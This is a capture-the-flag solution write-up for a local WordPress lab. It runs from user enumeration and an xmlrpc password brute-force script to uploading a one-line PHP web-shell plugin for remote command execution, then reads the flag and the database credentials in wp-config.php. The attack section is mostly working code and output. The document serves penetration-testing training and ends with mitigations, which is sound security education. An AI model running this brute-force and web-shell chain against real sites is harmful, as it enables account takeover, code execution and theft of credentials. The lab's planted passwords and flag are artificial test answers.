# wp-lab — Solution

> **Spoilers ahead.** Try cold first. The chain is a textbook real-world
> WordPress engagement: recon → user enumeration → xmlrpc brute-force →
> authenticated plugin upload → RCE → flag.

## The target

`http://localhost:8091/` — "MidwestRealty Properties" running on
WordPress 5.8.x with three users:

| ID | slug   | role     | password         |
|---:|--------|----------|------------------|
|  1 | admin  | admin    | `Welcome123!`    |
|  2 | bob    | author   | `bob123`         |
|  3 | editor | editor   | `Spring2024!`    |

The flag lives at `/flag.txt` inside the container, world-readable. You
need RCE to read it.

---

## Step 1 — Identify it as WordPress

```bash
curl -s http://localhost:8091/ | grep -oE 'wp-(content|includes)' | sort -u
curl -sI http://localhost:8091/wp-login.php
curl -s http://localhost:8091/readme.html | head -1
```

Generator meta tag in HTML and the `wp-login.php` page confirm WP. The
`readme.html` file usually leaks the major version on default installs.

## Step 2 — Enumerate users

Two reliable paths in default WordPress:

**REST API:**
```bash
curl -s http://localhost:8091/wp-json/wp/v2/users/ | python3 -m json.tool
```
Returns every user that has authored a published post — id, slug, display
name. Returns `admin`, `bob`, `editor`.

**Author redirect leak:**
```bash
for i in 1 2 3 4 5; do
  curl -s -o /dev/null -w "?author=$i -> %{redirect_url}\n" \
    "http://localhost:8091/?author=$i"
done
```
The redirect target reveals the slug:
```
?author=1 -> http://localhost:8091/author/admin/
?author=2 -> http://localhost:8091/author/bob/
?author=3 -> http://localhost:8091/author/editor/
```

(WPScan automates both paths: `wpscan --url http://localhost:8091 -e u`.)

## Step 3 — Probe `xmlrpc.php`

```bash
curl -s http://localhost:8091/xmlrpc.php
# "XML-RPC server accepts POST requests only."
```

Endpoint exists. List supported methods:
```bash
curl -s -X POST http://localhost:8091/xmlrpc.php \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
  | grep -oE 'wp\.getUsersBlogs|system\.multicall' | sort -u
```
`wp.getUsersBlogs` (login probe) and `system.multicall` (batch wrapper)
are both available. Promising.

## Step 4 — Try the multicall amplification trick (and watch it fail)

Classic xmlrpc brute-force amplification batches dozens of login attempts
into one HTTP request to bypass naive rate-limiting:

```python
import urllib.request

def call(user, pw):
    return ("<value><struct>"
            "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
            "<member><name>params</name><value><array><data>"
            f"<value><string>{user}</string></value>"
            f"<value><string>{pw}</string></value>"
            "</data></array></value></member>"
            "</struct></value>")

calls = "".join(call("admin", p) for p in
                ["password","admin","Welcome123!","letmein","qwerty"])
body  = ('<?xml version="1.0"?>'
         '<methodCall><methodName>system.multicall</methodName>'
         '<params><param><value><array><data>' + calls +
         '</data></array></value></param></params></methodCall>')

resp = urllib.request.urlopen(urllib.request.Request(
    "http://localhost:8091/xmlrpc.php",
    data=body.encode(), headers={"Content-Type":"text/xml"})).read().decode()
print(resp)
```

WordPress 4.4+ has a mitigation: every entry in the multicall returns
the same `403 Incorrect username or password.` even when one of the
candidates is correct. The amplification bypass is dead — but the
endpoint itself is still happy to take **one auth attempt per HTTP
request** with no rate limit.

## Step 5 — Brute-force admin via single requests

Build a small dictionary (top-N or rockyou) and walk it. Five hundred
requests in ~30 seconds locally with no slowdown:

```python
import urllib.request

PWDS = ["password","admin","123456","welcome","Welcome1",
        "Welcome123","Welcome123!","letmein","qwerty"]

def try_pw(p):
    body = ('<?xml version="1.0"?>'
            '<methodCall><methodName>wp.getUsersBlogs</methodName>'
            '<params><param><value><string>admin</string></value></param>'
            f'<param><value><string>{p}</string></value></param></params></methodCall>')
    resp = urllib.request.urlopen(urllib.request.Request(
        "http://localhost:8091/xmlrpc.php",
        data=body.encode(), headers={"Content-Type":"text/xml"})).read().decode()
    return "isAdmin" in resp

for p in PWDS:
    if try_pw(p):
        print(f"[+] HIT  admin / {p}")
        break
    print(f"[-] miss admin / {p}")
```
**Output:** `[+] HIT  admin / Welcome123!`

WPScan tooling alternative:
```bash
wpscan --url http://localhost:8091 \
       --usernames admin,bob,editor \
       --passwords /usr/share/wordlists/rockyou.txt \
       --max-threads 10
```

## Step 6 — Log in to wp-admin

```bash
# Manual cURL session
curl -c cookies.txt -b "wordpress_test_cookie=WP%20Cookie%20check" \
     -X POST http://localhost:8091/wp-login.php \
     --data-urlencode 'log=admin' \
     --data-urlencode 'pwd=Welcome123!' \
     --data-urlencode 'wp-submit=Log In' \
     --data-urlencode 'redirect_to=http://localhost:8091/wp-admin/' \
     --data-urlencode 'testcookie=1'

curl -b cookies.txt http://localhost:8091/wp-admin/ -o /dev/null -w "%{http_code}\n"
# -> 200 (Dashboard)
```

The `wordpress_test_cookie` must be set on the request — WP rejects
the login otherwise.

## Step 7 — Authenticated plugin upload → RCE

WordPress admins can upload arbitrary plugin zips. The zip is extracted
straight into `wp-content/plugins/<name>/` and any PHP inside becomes
reachable at `wp-content/plugins/<name>/<file>.php`.

**Build the payload (3 lines of PHP, packaged as a zip):**
```bash
mkdir pwn && cat > pwn/pwn.php <<'PHP'
<?php
/*
Plugin Name: PWN
*/
if (isset($_GET['c'])) { system($_GET['c']); exit; }
PHP
zip -r pwn.zip pwn
```

**Get the upload nonce:**
```bash
curl -s -b cookies.txt 'http://localhost:8091/wp-admin/plugin-install.php?tab=upload' \
  | grep -oE 'name="_wpnonce" +value="[a-f0-9]+"'
```

**Upload it:**
```bash
NONCE=...   # paste from above
curl -s -b cookies.txt 'http://localhost:8091/wp-admin/update.php?action=upload-plugin' \
     -F "_wpnonce=$NONCE" \
     -F "_wp_http_referer=/wp-admin/plugin-install.php?tab=upload" \
     -F "pluginzip=@pwn.zip" \
     -F "install-plugin-submit=Install Now"
```

The response includes an "Activate Plugin" link. You **don't actually
need to activate** — the zip is extracted into `wp-content/plugins/pwn/`
the moment the upload succeeds, and `pwn.php` is reachable at its URL
right away. WordPress only enforces "active" status for hook execution;
direct file requests bypass that. Activation is harmless if you want to
go through the motions:
```bash
curl -b cookies.txt 'http://localhost:8091/wp-admin/plugins.php?action=activate&plugin=pwn/pwn.php&_wpnonce=...'
```

**Trigger the shell:**
```bash
curl 'http://localhost:8091/wp-content/plugins/pwn/pwn.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl 'http://localhost:8091/wp-content/plugins/pwn/pwn.php?c=cat%20/flag.txt'
# FLAG{wp_xmlrpc_brute_to_plugin_rce_chain}
```

(Metasploit equivalent: `exploit/unix/webapp/wp_admin_shell_upload`.)

**🏁 Flag: `FLAG{wp_xmlrpc_brute_to_plugin_rce_chain}`**

## Step 8 — What's next from www-data

You're inside the WordPress container. Read interesting things:

```bash
curl 'http://localhost:8091/wp-content/plugins/pwn/pwn.php?c=cat%20/var/www/html/wp-config.php'
# Leaks DB credentials (WORDPRESS_DB_PASSWORD = WpDb!Pass2024)

curl 'http://localhost:8091/wp-content/plugins/pwn/pwn.php?c=cat%20/var/www/html/wp-content/uploads/.notes.txt'
# Internal note pointing at /flag.txt
```

The DB creds let you connect to the `wp-lab-db` MariaDB sidecar from
inside the network — useful for dumping `wp_users.user_pass` (bcrypt
hashes you could try to crack offline).

---

## Mitigations (for the report)

| Vuln | Real-world fix |
|---|---|
| User slug enumeration via `?author=N` | Disable author archives or rewrite slugs |
| User enumeration via REST API | Restrict `wp/v2/users` to authenticated callers |
| `xmlrpc.php` enabled | Disable in `.htaccess` (`Require all denied`) or block at the edge |
| No rate limiting on `xmlrpc.php` | Fail2ban for repeated 403s, or move to MFA |
| Weak admin password | Enforce a strong password policy; consider WP-2FA |
| Plugin upload as admin = full RCE | Set `define('DISALLOW_FILE_MODS', true);` in wp-config.php to disable theme/plugin install via the UI |
